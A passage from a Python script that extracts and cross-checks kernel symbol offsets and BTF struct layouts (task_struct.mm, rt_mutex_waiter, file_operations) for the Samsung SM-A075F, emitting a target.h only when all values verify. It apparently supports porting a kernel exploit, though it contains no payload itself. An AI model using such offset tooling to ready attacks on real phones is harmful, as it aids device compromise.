    lines.extend(f"#define {name} {value}" for name, value in macros.items())
    lines.extend(["", "#endif  /* OFFSET_H */", ""])
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text("\n".join(lines))


def markdown_report(sections: list[str], missing: list[str], warnings: list[str], ready: bool) -> str:
    lines = [
        "# SM-A075F target extraction report",
        "",
        f"**Status:** {'READY' if ready else 'BLOCKED — no production target.h emitted'}",
        f"**Model:** {MODEL}",
        f"**Expected kernel:** {KERNEL_VERSION}",
        "",
        "A17/SM-A175F values are not used as A07 defaults. Runtime kallsyms addresses are never treated as image-relative offsets.",
        "",
    ]
    if missing:
        lines.extend(["## Missing or unverified items", ""])
        lines.extend(f"- `{item}`" for item in missing)
        lines.append("")
    if warnings:
        lines.extend(["## Warnings", ""])
        lines.extend(f"- {item}" for item in warnings)
        lines.append("")
    lines.extend(sections)
    return "\n".join(lines) + "\n"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--release-assets", type=Path, required=True)
    parser.add_argument("--output-dir", type=Path, required=True)
    parser.add_argument(
        "--profile",
        type=Path,
        default=Path("src/targets/a07-SM-A075F/target-values.json"),
        help="A07-only JSON of manually verified values and evidence; no A17 fallback is used.",
    )
    parser.add_argument("--expected-kernel", default=KERNEL_VERSION)
    args = parser.parse_args()

    out_dir = args.output_dir.resolve()
    out_dir.mkdir(parents=True, exist_ok=True)
    # A rerun in an existing directory must not leave a previously successful header behind.
    for stale in ("target.h", "target-metadata.json", "kernel-release.txt", "symbol-offsets.json", "btf-layouts.json"):
        (out_dir / stale).unlink(missing_ok=True)
    work_dir = out_dir / "work"
    work_dir.mkdir(exist_ok=True)
    sections: list[str] = []
    warnings: list[str] = []
    missing: list[str] = []
    selected_kernel: Path | None = None
    kernel_release: str | None = None
    text_base: int | None = None
    nm_symbols: dict[str, int] = {}
    readelf_symbols: dict[str, int] = {}
    kallsyms_names: set[str] = set()
    source_root: Path | None = None
    btf_fields: dict[str, dict[str, int]] = {}
    btf_sizes: dict[str, int] = {}
    pahole_outputs: dict[str, str] = {}

    assets = args.release_assets.resolve()
    expected_assets = {
        "SM-A075F_16_Opensource.zip": True,
        "kernel.elf": True,
        "kernel.raw": False,
        "kallsyms.txt": True,
        "vmlinux.btf": True,
    }
    asset_paths: dict[str, Path] = {}
    for name, required in expected_assets.items():
        try:
            found = asset_file(assets, name, required=required)
            if found:
                asset_paths[name] = found
        except (FileNotFoundError, RuntimeError) as error:
            missing.append(str(error))

    # Extract the exact Kernel/Kernel.tar.gz requested from Samsung's source zip.
    if "SM-A075F_16_Opensource.zip" in asset_paths:
        try:
            source_root, zip_entry = extract_kernel_source(
                asset_paths["SM-A075F_16_Opensource.zip"], work_dir / "source"
            )
            sched_header = source_root / "include/linux/sched.h"
            source_has_mm, source_line, source_context = task_struct_source_mm(sched_header)
            sections.append(
                "## Samsung source archive\n\n"
                f"- Source zip entry extracted: `{zip_entry}`\n"
                f"- Kernel source root: `{sched_header.parent.parent.parent.name}`\n"
                f"- `include/linux/sched.h` contains `struct mm_struct *mm`: **{source_has_mm}**"
                + (f" (line {source_line}: `{source_context}`)" if source_has_mm else "")
                + "\n"
            )
            if not source_has_mm:
                missing.append("source include/linux/sched.h: struct task_struct.mm declaration")
        except Exception as error:  # report the source archive failure, then still audit other inputs
            missing.append(f"Samsung Kernel.tar.gz extraction/source check failed: {error}")
            source_has_mm, source_line, source_context = False, None, None
    else:
        source_has_mm, source_line, source_context = False, None, None

    # Respect the requested preference: use kernel.elf as-is when complete; recover kernel.raw only
    # when the ELF is stripped, corrupt, non-AArch64, or missing core symbols.
    if "kernel.elf" in asset_paths:
        direct_ok, direct_problems, direct_nm, direct_re, direct_base = elf_probe(asset_paths["kernel.elf"])
        if direct_ok:
            selected_kernel = asset_paths["kernel.elf"]
            nm_symbols, readelf_symbols, text_base = direct_nm, direct_re, direct_base
            sections.append("## Kernel ELF selection\n\n- Used the supplied `kernel.elf` directly; it passed the ELF/symbol completeness checks.\n")
        else:
            warnings.append("supplied kernel.elf is incomplete; attempting kernel.raw conversion: " + "; ".join(direct_problems))
            if "kernel.raw" in asset_paths and shutil.which("vmlinux-to-elf"):
                recovered = work_dir / "kernel-recovered.elf"
                convert = run(["vmlinux-to-elf", str(asset_paths["kernel.raw"]), str(recovered)], check=False)
                if convert.returncode == 0 and recovered.is_file():
                    recovered_ok, recovered_problems, recovered_nm, recovered_re, recovered_base = elf_probe(recovered)
                    if recovered_ok:
                        selected_kernel = recovered
                        nm_symbols, readelf_symbols, text_base = recovered_nm, recovered_re, recovered_base
                        sections.append("## Kernel ELF selection\n\n- `kernel.elf` was incomplete; converted `kernel.raw` with `vmlinux-to-elf` and used the recovered ELF.\n")
                    else:
                        missing.append("converted kernel.raw ELF remains incomplete: " + "; ".join(recovered_problems))
                        # An incomplete ELF can still supply *diagnostic* exact-name offsets.
                        # Keep the missing-symbol blocker so it can never generate target.h.
                        if recovered_nm and recovered_base is not None and "ELF machine is not AArch64" not in recovered_problems:
                            selected_kernel = recovered
                            nm_symbols, readelf_symbols, text_base = recovered_nm, recovered_re, recovered_base
                            sections.append("## Kernel ELF selection\n\n- Converted `kernel.raw` for diagnostic-only ELF/kallsyms symbol auditing. Incomplete: **no production header**.\n")
                else:
                    missing.append("vmlinux-to-elf conversion of kernel.raw failed: " + convert.stderr.strip())
            else:
                missing.append("kernel.elf is incomplete and kernel.raw/vmlinux-to-elf is unavailable")
            if selected_kernel is None and direct_nm and direct_base is not None and "ELF machine is not AArch64" not in direct_problems:
                selected_kernel = asset_paths["kernel.elf"]
                nm_symbols, readelf_symbols, text_base = direct_nm, direct_re, direct_base
                sections.append("## Kernel ELF selection\n\n- Audited partial `kernel.elf` for diagnostics only. Incomplete: **no production header**.\n")
    if selected_kernel is None:
        missing.append("usable AArch64 kernel ELF with a symbol table")

    if selected_kernel:
        kernel_release = find_linux_release(selected_kernel)
        if not kernel_release:
            missing.append("exact UTS_RELEASE from the kernel ELF Linux version banner")
        elif not kernel_release.startswith(args.expected_kernel + "-") and kernel_release != args.expected_kernel:
            missing.append(
                f"kernel ELF release is `{kernel_release}`, not the requested {args.expected_kernel} build"
            )
        (out_dir / "kernel-release.txt").write_text((kernel_release or "") + "\n")

    if "kallsyms.txt" in asset_paths:
        try:
            kallsyms_names = parse_kallsyms(asset_paths["kallsyms.txt"])
            sections.append(
                "## kallsyms cross-check\n\n"
                f"- Parsed {len(kallsyms_names)} symbol names from the supplied kallsyms file.\n"
                "- Runtime kallsyms addresses are treated as presence checks only, not as unslid ELF offsets.\n"
            )
        except Exception as error:
            missing.append(f"could not parse kallsyms.txt: {error}")

    # Resolve expected symbols from the ELF's nm/readelf tables and compare names with kallsyms.
    symbol_rows: list[dict[str, Any]] = []
    all_specs = {**SYMBOL_MACROS, **DIAGNOSTIC_SYMBOLS}
    elf_names = set(nm_symbols) | set(readelf_symbols)
    for canonical, aliases in all_specs.items():
        chosen = next((name for name in aliases if name in nm_symbols or name in readelf_symbols), None)
        address = nm_symbols.get(chosen) if chosen else None
        if address is None and chosen:
            address = readelf_symbols.get(chosen)
        required = canonical in SYMBOL_MACROS
        row: dict[str, Any] = {
            "canonical": canonical,
            "aliases": list(aliases),
            "required_for_target_header": required,
            "found_in_elf": chosen is not None,
            "found_in_kallsyms": any(name in kallsyms_names for name in aliases),
        }
        if chosen:
            row["matched_symbol"] = chosen
            if required and chosen not in kallsyms_names:
                missing.append(f"kallsyms.txt lacks exact required ELF symbol `{chosen}` for {canonical}")
        if address is not None and text_base is not None:
            row["elf_offset"] = f"0x{address - text_base:x}"
        if chosen is None:
            suggestions = sorted(set(sum((closest_names(alias, elf_names) for alias in aliases), [])))
            kallsyms_suggestions = sorted(set(sum((closest_names(alias, kallsyms_names) for alias in aliases), [])))
            row["closest_elf_names"] = suggestions[:5]
            row["closest_kallsyms_names"] = kallsyms_suggestions[:5]
            if required:
                missing.append(
                    f"symbol `{aliases[0]}` required for {canonical}; closest ELF matches: "
                    f"{', '.join(suggestions[:5]) or '(none)'}; closest kallsyms matches: "
                    f"{', '.join(kallsyms_suggestions[:5]) or '(none)'}"
                )
        symbol_rows.append(row)

    symbol_report = ["## ELF/kallsyms symbol audit", ""]
    for row in symbol_rows:
        names = ", ".join(row["aliases"])
        category = "required" if row["required_for_target_header"] else "diagnostic"
        if row["found_in_elf"]:
            symbol_report.append(
                f"- `{names}` ({category}): ELF match `{row.get('matched_symbol')}`; "
                f"kallsyms present: `{row['found_in_kallsyms']}`; "
                f"image-relative offset: `{row.get('elf_offset', 'unavailable')}`"
            )
        else:
            elf_closest = ", ".join(row.get("closest_elf_names", [])) or "(none)"
            kallsyms_closest = ", ".join(row.get("closest_kallsyms_names", [])) or "(none)"
            symbol_report.append(
                f"- `{names}` ({category}): **missing**; closest ELF: `{elf_closest}`; "
                f"closest kallsyms: `{kallsyms_closest}`"
            )
    symbol_report.append("")
    sections.append("\n".join(symbol_report))

    # Confirm nm/readelf agree for every shared exact symbol; do not silently prefer one table.
    disagreements = [
        name for name in set(nm_symbols) & set(readelf_symbols)
        if nm_symbols[name] != readelf_symbols[name]
    ]
    if disagreements:
        missing.append("nm/readelf address disagreement for: " + ", ".join(sorted(disagreements)[:20]))

    offsets: dict[str, int] = {}
    if text_base is not None:
        for macro, aliases in SYMBOL_MACROS.items():
            chosen = next((name for name in aliases if name in nm_symbols or name in readelf_symbols), None)
            if chosen:
                address = nm_symbols.get(chosen, readelf_symbols.get(chosen))
                if address is not None and address >= text_base:
                    offsets[macro] = address - text_base
                elif address is not None:
                    missing.append(
                        f"symbol `{chosen}` for {macro} is below the ELF .text base; "
                        "cannot emit a non-negative image-relative offset"
                    )

    # Attach BTF to a temporary ELF and run pahole against that BTF. No structure data is copied
    # from the A17 header. task_struct.mm is checked against both BTF and the Samsung source header.
    if selected_kernel and "vmlinux.btf" in asset_paths:
        try:
            btf_elf = work_dir / "vmlinux-with-btf.elf"
            make_btf_elf(asset_paths["vmlinux.btf"], btf_elf)
            btf_types: dict[str, dict[str, tuple[str, bool]]] = {}

            def ensure_type(name: str) -> None:
                """pahole a type on demand, once, so nested paths can be walked from real BTF."""
                if not name or name in btf_fields:
                    return
                fields, types, size, raw = pahole_type(btf_elf, name)
                pahole_outputs[name] = raw
                btf_fields[name] = fields
                btf_types[name] = types
                if size is not None:
                    btf_sizes[name] = size

            for type_name in sorted({t for t, _ in BTF_FIELD_MACROS.values()} | set(BTF_SIZE_MACROS.values()) | {"task_struct"}):
                ensure_type(type_name)
            mm_offset = btf_fields.get("task_struct", {}).get("mm")
            mm_line = next(
                (line.strip() for line in pahole_outputs.get("task_struct", "").splitlines()
                 if re.search(r"\bmm\s*;", line) and "/*" in line),
                "",
            )
            btf_mm_type_ok = bool(re.search(r"struct\s+mm_struct\s*\*\s*mm\s*;", mm_line))
            mm_valid = mm_offset is not None and source_has_mm and btf_mm_type_ok
            if mm_offset is None:
                missing.append("vmlinux.btf/pahole: task_struct.mm member offset")
            if not btf_mm_type_ok:
                missing.append("vmlinux.btf/pahole: task_struct.mm type is not struct mm_struct *")
            if not source_has_mm:
                # Source failure already reported above; retain one exact cross-check failure.
                if not any("sched.h" in item for item in missing):
                    missing.append("source include/linux/sched.h: task_struct.mm declaration")
            sections.append(
                "## task_struct.mm cross-check\n\n"
                f"- BTF/pahole member offset: `{('0x%x' % mm_offset) if mm_offset is not None else 'MISSING'}`\n"
                f"- BTF type: `{mm_line or 'MISSING'}`\n"
                f"- Source declaration: `{source_context or 'MISSING'}` (line {source_line or 'n/a'})\n"
                f"- Type/name agree: **{mm_valid}**\n"
            )
            # What pahole reported before any nested derivation, so diagnostics keep showing the
            # kernel's own layout rather than this script's conclusions about it.
            raw_btf_fields = {name: dict(fields) for name, fields in btf_fields.items()}

            def path_types(root: str, path: str) -> dict[str, list[str]]:
                """Every struct a path walks through, with the members pahole really parsed."""
                seen: dict[str, list[str]] = {}
                current = root
                for part in path.split("."):
                    ensure_type(current)
                    seen[current] = sorted(btf_fields.get(current, {}))
                    nested = btf_types.get(current, {}).get(part)
                    if not nested or nested[1]:
                        break
                    current = nested[0]
                return seen

            derived_members: dict[str, Any] = {}
            for macro, (root, path, cross_check, leaf_type) in DERIVED_BTF_PATHS.items():
                declared_type, declared_member = BTF_FIELD_MACROS[macro]
                if declared_member in raw_btf_fields.get(declared_type, {}):
                    continue  # the flat member exists in this kernel; no derivation is needed
                offset, evidence, container = resolve_btf_path(
                    btf_fields, btf_types, btf_sizes, ensure_type, root, path
                )
                record: dict[str, Any] = {"root": root, "path": path, "evidence": evidence}
                if offset is None:
                    record["status"] = "unresolved"
                    record["types"] = path_types(root, path)
                    derived_members[macro] = record
                    continue
                if leaf_type:
                    leaf_member = path.split(".")[-1]
                    observed_type = btf_types.get(container, {}).get(leaf_member)
                    if not observed_type or observed_type[1] or observed_type[0] != leaf_type:
                        record["status"] = "cross-check-failed"
                        record["crossCheck"] = (
                            f"struct {container}.{leaf_member} must embed struct {leaf_type}"
                        )
                        record["observed"] = observed_type
                        record["types"] = path_types(root, path)
                        derived_members[macro] = record
                        continue
                    record["crossCheck"] = (
                        f"struct {container}.{leaf_member} embeds struct {leaf_type} (verified)"
                    )
                if cross_check:
                    member, expected = cross_check
                    actual = btf_fields.get(root, {}).get(member)
                    if actual != expected:
                        record["status"] = "cross-check-failed"
                        record["crossCheck"] = f"struct {root}.{member} == 0x{expected:x}"
                        record["observed"] = actual
                        record["types"] = path_types(root, path)
                        derived_members[macro] = record
                        continue
                    record["crossCheck"] = f"struct {root}.{member} == 0x{expected:x} (verified)"
                for spacing_root, first, second in DERIVED_SPACING_CHECKS:
                    if root != spacing_root or first not in path.split(".")[0:1]:
                        continue
                    embedded = btf_types.get(spacing_root, {}).get(first)
                    both = btf_fields.get(spacing_root, {})
                    if not embedded or embedded[1] or first not in both or second not in both:
                        continue
                    ensure_type(embedded[0])
                    inner_size = btf_sizes.get(embedded[0])
                    spacing = both[second] - both[first]
                    if inner_size is None:
                        record["spacingCheck"] = f"sizeof(struct {embedded[0]}) unknown"
                    elif spacing != inner_size:
                        record["status"] = "cross-check-failed"
                        record["spacingCheck"] = (
                            f"struct {spacing_root}.{second} - .{first} = 0x{spacing:x}, "
                            f"but sizeof(struct {embedded[0]}) = 0x{inner_size:x}"
                        )
                        break
                    else:
                        record["spacingCheck"] = (
                            f"struct {spacing_root}.{second} - .{first} = 0x{spacing:x} "
                            f"== sizeof(struct {embedded[0]}) (verified)"
                        )
                if record.get("status") == "cross-check-failed":
                    record["types"] = path_types(root, path)
                    derived_members[macro] = record
                    continue
                record["status"] = "derived"
                record["offset"] = offset
                derived_members[macro] = record
                btf_fields.setdefault(declared_type, {})[declared_member] = offset

            missing_btf = []
            incomplete_structs: set[str] = set()
            for macro, (type_name, member) in BTF_FIELD_MACROS.items():
                if member not in btf_fields.get(type_name, {}):
                    missing_btf.append(f"{type_name}.{member} -> {macro}")
                    incomplete_structs.add(type_name)
            for macro, type_name in BTF_SIZE_MACROS.items():
                if type_name not in btf_sizes:
                    missing_btf.append(f"sizeof(struct {type_name}) -> {macro}")
                    incomplete_structs.add(type_name)
            if missing_btf:
                missing.extend("BTF/pahole missing " + item for item in missing_btf)
            for macro, (old_type, old_member, new_type, note) in MOVED_BTF_MACROS.items():
                if old_member in raw_btf_fields.get(old_type, {}):
                    continue
                ensure_type(new_type)
                relocated = btf_fields.get(new_type, {}).get(old_member)
                missing.append(
                    f"{old_type}.{old_member} -> {macro} has no {old_type}-relative offset in this "
                    f"kernel (member {'is at 0x%x of struct %s' % (relocated, new_type) if relocated is not None else 'was not found in struct ' + new_type + ' either'}); {note}"
                )
            # Ground truth for a reviewer: what pahole actually saw for the structs whose members
            # are absent. Reading the A07 layout is how LEGACY/COMPACT rt_mutex_waiter and the
            # file_operations set are decided; it is never inferred from another device's header.
            btf_diagnostic = {
                name: {
                    "parsedMembers": sorted(raw_btf_fields.get(name, {})),
                    "rawPahole": pahole_outputs.get(name, "")[:4000],
                }
                for name in sorted(incomplete_structs)
            }
            waiter = sorted(raw_btf_fields.get("rt_mutex_waiter", {}))
            waiter_candidate = None
            if waiter:
                legacy_only = {"pi_tree_entry", "pi_tree_prio", "pi_tree_deadline"}
                compact_only = {"tree_entry", "prio", "deadline"}
                nested = {"tree", "pi_tree"}
                if legacy_only <= set(waiter):
                    waiter_candidate = "LEGACY_RT_MUTEX_WAITER=1 (BTF carries the pi_tree_* members)"
                elif compact_only <= set(waiter):
                    waiter_candidate = "COMPACT_RT_MUTEX_WAITER=1 (BTF carries tree_entry/prio/deadline)"
                elif nested <= set(waiter):
                    waiter_candidate = (
                        "NEITHER FLAG FITS: rt_mutex_waiter embeds `tree`/`pi_tree` node structs, so "
                        "prio/deadline are nested rather than flat. src/common.h only offers the "
                        "LEGACY and COMPACT layouts; choosing one for A07 is a source-level porting "
                        f"decision, not a value to guess. Measured members: {', '.join(waiter)}"
                    )
                else:
                    waiter_candidate = (
                        "undetermined: rt_mutex_waiter has neither the legacy pi_tree_* set nor "
                        f"tree_entry/prio/deadline; parsed members: {', '.join(waiter)}"
                    )
            (out_dir / "btf-layouts.json").write_text(
                json.dumps(
                    {
                        "model": MODEL,
                        "kernelVersion": KERNEL_VERSION,
                        "task_struct_mm": {
                            "btfOffset": mm_offset,
                            "sourceHeader": "include/linux/sched.h",
                            "sourceLine": source_line,
                            "sourceDeclaration": source_context,
                            "verified": mm_valid,
                        },
                        "structs": {
                            name: {"size": btf_sizes.get(name), "fields": fields}
                            for name, fields in sorted(btf_fields.items())
                        },
                        "rtMutexWaiterLayoutCandidate": waiter_candidate,
                        "derivedMembers": derived_members,
                        "incompleteStructDiagnostics": btf_diagnostic,
                    },
                    indent=2,
                    sort_keys=True,
                )
                + "\n"
            )
            if derived_members:
                sections.append(
                    "## Nested BTF derivation (measured, with cross-checks)\n\n"
                    + "".join(
                        f"- `{macro}`: **{info.get('status')}** via `{info['root']}.{info['path']}`"
                        + (f" = `0x{info['offset']:x}`" if info.get("offset") is not None else "")
                        + f"\n  - evidence: {info.get('evidence')}\n"
                        + (f"  - cross-check: {info['crossCheck']}\n" if info.get("crossCheck") else "")
                        + (f"  - spacing check: {info['spacingCheck']}\n" if info.get("spacingCheck") else "")
                        for macro, info in sorted(derived_members.items())
                    )
                    + "\nDerived offsets are injected only after their cross-checks pass; an\n"
                    "unresolved or failed path stays a reported gap rather than a value.\n"
                )
            if waiter_candidate or btf_diagnostic:
                sections.append(
                    "## BTF layout evidence (measured candidates, not applied)\n\n"
                    + (f"- `rt_mutex_waiter` layout candidate: {waiter_candidate}\n" if waiter_candidate else "")
                    + "".join(
                        f"- `struct {name}` members pahole parsed: {', '.join(info['parsedMembers']) or '(none)'}\n"
                        for name, info in btf_diagnostic.items()
                    )
                    + "\nThese are measurements of A07's own BTF, reported for review. The production\n"
                    "header is still emitted only from verified symbols plus the evidence-bearing profile.\n"
                )
        except Exception as error:
            missing.append(f"pahole/BTF audit failed: {error}")
    else:
        missing.append("vmlinux.btf or usable kernel ELF unavailable for pahole structure audit")

    try:
        profile, evidence, profile_missing = profile_values(args.profile)
        missing.extend(profile_missing)
        if profile and profile.get("kernelRelease") != kernel_release:
            missing.append(
                "profile kernelRelease does not match the exact ELF UTS_RELEASE "
                f"({profile.get('kernelRelease')!r} != {kernel_release!r})"
            )
    except Exception as error:
        profile, evidence = {}, {}
        missing.append(f"verified target profile could not be parsed: {error}")


    offsets_path = out_dir / "symbol-offsets.json"
    offsets_path.write_text(
        json.dumps(
            {
                "model": MODEL,
                "kernelVersion": KERNEL_VERSION,
                "kernelRelease": kernel_release,
                "imageTextBase": f"0x{text_base:x}" if text_base is not None else None,
                "symbols": symbol_rows,
                "offsetMacros": {name: f"0x{value:x}" for name, value in sorted(offsets.items())},
            },
            indent=2,
            sort_keys=True,
        )
        + "\n"
    )

    # De-duplicate while keeping the first, most specific explanation.
    missing = list(dict.fromkeys(missing))
    ready = not missing
    if ready:
        try:
            assert selected_kernel is not None and kernel_release is not None and text_base is not None
            emit_header(
                out_dir / "target.h",
                kernel_release,
                text_base,
                {**nm_symbols, **readelf_symbols},
                btf_fields,
                btf_sizes,
                profile,
            )
            metadata = {
                "model": MODEL,
                "kernelVersion": KERNEL_VERSION,
                "kernelRelease": kernel_release,
                "targetHeader": "target.h",
                "targetHeaderSha256": hashlib.sha256((out_dir / "target.h").read_bytes()).hexdigest(),
                "sourceMmVerified": True,
                "profileEvidenceKeys": sorted(evidence),
            }
            (out_dir / "target-metadata.json").write_text(json.dumps(metadata, indent=2, sort_keys=True) + "\n")
            sections.append("## Header\n\n- Generated `target.h` from exact ELF symbol offsets, A07 BTF layouts, and evidence-bearing A07 profile values.\n")
        except Exception as error:
            missing.append(f"target.h generation failed: {error}")
            ready = False

    (out_dir / "report.md").write_text(markdown_report(sections, missing, warnings, ready))
    status = {
        "model": MODEL,
        "kernelVersion": KERNEL_VERSION,
        "kernelRelease": kernel_release,
        "ready": ready,
        "missing": missing,
        "warnings": warnings,
    }
    (out_dir / "status.json").write_text(json.dumps(status, indent=2, sort_keys=True) + "\n")

    if not ready:
        print("::error::A07 target profile is incomplete; no production target.h was emitted.")
        for item in missing:
            print(f"::error::{item}")
        return 1
    print(f"A07 target profile ready: {kernel_release}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
